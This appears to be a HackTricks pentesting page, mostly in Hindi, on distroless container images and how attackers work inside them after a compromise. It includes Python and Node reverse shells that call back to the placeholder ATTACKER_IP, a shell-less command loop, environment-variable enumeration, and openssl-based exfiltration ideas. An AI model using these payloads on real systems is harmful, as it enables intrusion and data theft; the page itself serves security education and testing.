# Distroless कंटेनर

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

एक **distroless** container image वह image है जो किसी एक विशिष्ट application को चलाने के लिए आवश्यक **न्यूनतम runtime घटक** प्रदान करता है, और जानबूझकर सामान्य distribution tooling जैसे package managers, shells, और बड़े पैमाने के generic userland utilities को हटा देता है। व्यवहार में, distroless images अक्सर केवल application binary या runtime, उसकी shared libraries, certificate bundles, और बहुत छोटा filesystem layout ही शामिल करते हैं।

मुद्दा यह नहीं है कि distroless कोई नया kernel isolation primitive है। Distroless एक **image design strategy** है। यह container filesystem के **अंदर** क्या उपलब्ध है उसे बदलता है, न कि kernel किस तरह container को अलग करता है। यह अंतर महत्वपूर्ण है, क्योंकि distroless वातावरण को मुख्यतः इस तरह harden करता है कि attacker को code execution मिलने के बाद कम चीजें उपलब्ध हों। यह namespaces, seccomp, capabilities, AppArmor, SELinux, या किसी अन्य runtime isolation mechanism की जगह नहीं लेता।

## Distroless क्यों मौजूद है

Distroless images मुख्यतः घटाते हैं:

- image का आकार
- image की operational जटिलता
- उन packages और binaries की संख्या जिनमें vulnerabilities हो सकती हैं
- डिफ़ॉल्ट रूप से attacker के पास उपलब्ध post-exploitation उपकरणों की संख्या

इसी लिए distroless images production application deployments में लोकप्रिय हैं। एक container जिसमें कोई shell नहीं, कोई package manager नहीं, और लगभग कोई generic tooling नहीं होती है, उसे operational रूप से समझना आमतौर पर आसान होता है और compromise के बाद interactive रूप से दुरुपयोग करना कठिन होता है।

प्रसिद्ध distroless-शैली की image families के उदाहरणों में शामिल हैं:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless का क्या मतलब नहीं है

एक distroless container स्वचालित रूप से नहीं होता:

- rootless
- non-privileged
- read-only
- seccomp, AppArmor, या SELinux द्वारा सुरक्षित
- container escape से सुरक्षित

यह अभी भी संभव है कि कोई distroless image `--privileged` के साथ चलाया जाए, host namespace शेयरिंग की जाए, खतरनाक bind mounts हों, या कोई mounted runtime socket मौजूद हो। ऐसे परिदृश्य में image भले ही minimal हो, container फिर भी गंभीर रूप से असुरक्षित हो सकता है। Distroless **userland attack surface** बदलता है, न कि **kernel trust boundary**।

## सामान्य ऑपरेशनल विशेषताएँ

जब आप किसी distroless container को compromise करते हैं, तो सबसे पहले आप महसूस करेंगे कि सामान्य मान्यताएँ काम करना बंद कर देती हैं। वहां शायद कोई `sh`, कोई `bash`, कोई `ls`, कोई `id`, कोई `cat` न हो, और कभी-कभी वो libc-based environment भी मौजूद न हो जो आपकी सामान्य tradecraft की उम्मीदों के अनुसार व्यवहार करे। यह offensive और defensive दोनों को प्रभावित करता है, क्योंकि tooling की कमी debugging, incident response, और post-exploitation को अलग बनाती है।

सबसे सामान्य पैटर्न हैं:

- application runtime मौजूद होता है, पर अन्य बहुत कम चीजें होती हैं
- shell-based payloads fail कर जाते हैं क्योंकि shell नहीं होता
- सामान्य enumeration one-liners fail कर जाते हैं क्योंकि helper binaries गायब होते हैं
- filesystem protections जैसे read-only rootfs या writable tmpfs locations पर `noexec` अक्सर मौजूद रहते हैं

यह संयोजन अक्सर लोगों को "weaponizing distroless" के बारे में बात करने के लिए प्रेरित करता है।

## Distroless और Post-Exploitation

distroless वातावरण में मुख्य offensive चुनौती हमेशा initial RCE नहीं होती। अक्सर असली चुनौती उसके बाद आती है। अगर exploited workload किसी language runtime जैसे Python, Node.js, Java, या Go में code execution देता है, तो आप arbitrary logic चला सकते हैं, लेकिन सामान्य shell-centric workflows के माध्यम से नहीं जो अन्य Linux लक्ष्य में सामान्य होते हैं।

इसका मतलब है कि post-exploitation अक्सर तीन दिशाओं में से एक में शिफ्ट हो जाता है:

1. **Use the existing language runtime directly** — environment enumerate करने, sockets खोलने, files पढ़ने, या अतिरिक्त payloads stage करने के लिए।
2. **Bring your own tooling into memory** — अगर filesystem read-only है या writable locations `noexec` पर mount हैं।
3. **Abuse existing binaries already present in the image** — अगर application या उसकी dependencies में कुछ अनपेक्षित रूप से उपयोगी मौजूद है।

## दुरुपयोग

### अपने पास मौजूद runtime की जाँच करें

कई distroless containers में shell नहीं होता, पर वहां फिर भी application runtime मौजूद रहता है। अगर target एक Python service है, तो Python वहाँ होगा। अगर target Node.js है, तो Node वहाँ होगा। अक्सर यह फ़ाइलें enumerate करने, environment variables पढ़ने, reverse shells खोलने, और `/bin/sh` को invoke किए बिना ही in-memory execution stage करने के लिए पर्याप्त functionality देता है।

Python के साथ एक साधारण उदाहरण:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js के साथ एक सरल उदाहरण:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- environment variables की पुनर्प्राप्ति, जो अक्सर credentials या service endpoints शामिल करते हैं
- filesystem enumeration `/bin/ls` के बिना
- writable paths और mounted secrets की पहचान

### Reverse Shell `/bin/sh` के बिना

यदि image में `sh` या `bash` मौजूद नहीं है, तो क्लासिक shell-based reverse shell तुरंत फेल हो सकती है। ऐसी स्थिति में, इंस्टॉल किए गए language runtime का उपयोग करें।

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
यदि `/bin/sh` मौजूद नहीं है, तो अंतिम पंक्ति को direct Python-driven command execution या Python REPL loop से बदल दें।

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
फिर से, यदि `/bin/sh` अनुपस्थित है, तो शेल spawn करने की बजाय Node के filesystem, process, और networking APIs को सीधे उपयोग करें।

### पूरा उदाहरण: No-Shell Python Command Loop

यदि image में Python है लेकिन बिलकुल भी शेल नहीं है, तो एक simple interactive loop अक्सर पूरी post-exploitation क्षमता बनाए रखने के लिए पर्याप्त होता है:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
इसके लिए किसी interactive shell binary की आवश्यकता नहीं होती। हमलावर के दृष्टिकोण से प्रभाव मूलतः एक basic shell जैसा ही है: command execution, enumeration, और existing runtime के माध्यम से आगे payloads की staging।

### इन-मेमोरी टूल निष्पादन

Distroless images अक्सर निम्न के साथ संयोजित होते हैं:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

यह संयोजन classic "download binary to disk and run it" workflows को अविश्वसनीय बना देता है। ऐसे मामलों में, memory execution techniques प्रमुख उत्तर बन जाती हैं।

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### इमेज में पहले से मौजूद बाइनरीज़

कुछ Distroless images में अभी भी ऑपरेशनल रूप से आवश्यक बाइनरीज़ होती हैं जो compromise के बाद उपयोगी हो जाती हैं। बार-बार देखा जाने वाला एक उदाहरण `openssl` है, क्योंकि applications कभी-कभी crypto- या TLS‑संबंधी कार्यों के लिए इसकी आवश्यकता होती है।

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` मौजूद है, तो इसे उपयोग किया जा सकता है:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

सटीक दुरुपयोग इस बात पर निर्भर करेगा कि वास्तव में क्या इंस्टॉल है, लेकिन सामान्य विचार यह है कि distroless का मतलब "कोई टूल बिल्कुल भी नहीं" नहीं है; इसका मतलब है "एक सामान्य distribution image की तुलना में बहुत कम टूल"।

## Checks

इन चेक्स का उद्देश्य यह निर्धारित करना है कि क्या image व्यवहार में वास्तव में distroless है और कौन से runtime या helper binaries अभी भी post-exploitation के लिए उपलब्ध हैं।
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:
- अगर कोई shell मौजूद नहीं है लेकिन Python या Node जैसे runtime मौजूद हैं, तो post-exploitation को runtime-driven execution की ओर pivot करना चाहिए।
- अगर root filesystem read-only है और `/dev/shm` writable है लेकिन `noexec`, तो memory execution तकनीकें अधिक प्रासंगिक हो जाती हैं।
- अगर helper binaries जैसे `openssl`, `busybox`, या `java` मौजूद हैं, तो वे आगे की पहुँच bootstrap करने के लिए पर्याप्त फ़ंक्शनलिटी दे सकते हैं।

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | डिज़ाइन के अनुसार न्यूनतम userland | कोई shell नहीं, कोई package manager नहीं, केवल application/runtime dependencies | debugging layers जोड़ना, sidecar shells, busybox या अन्य tooling कॉपी करना |
| Chainguard minimal images | डिज़ाइन के अनुसार न्यूनतम userland | पैकेज सतह कम, अक्सर एक runtime या service पर केंद्रित | `:latest-dev` या debug variants का उपयोग करना, build के दौरान tools कॉपी करना |
| Kubernetes workloads using distroless images | Pod config पर निर्भर | Distroless केवल userland को प्रभावित करता है; Pod की security posture अभी भी Pod spec और runtime defaults पर निर्भर करती है | ephemeral debug containers जोड़ना, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | run flags पर निर्भर | न्यूनतम filesystem, लेकिन runtime security अभी भी flags और daemon configuration पर निर्भर करती है | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

The key point is that distroless is an **image property**, not a runtime protection. इसका लाभ यह है कि यह समझौते के बाद फ़ाइल सिस्टम के अंदर उपलब्ध चीज़ों को कम कर देता है।

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
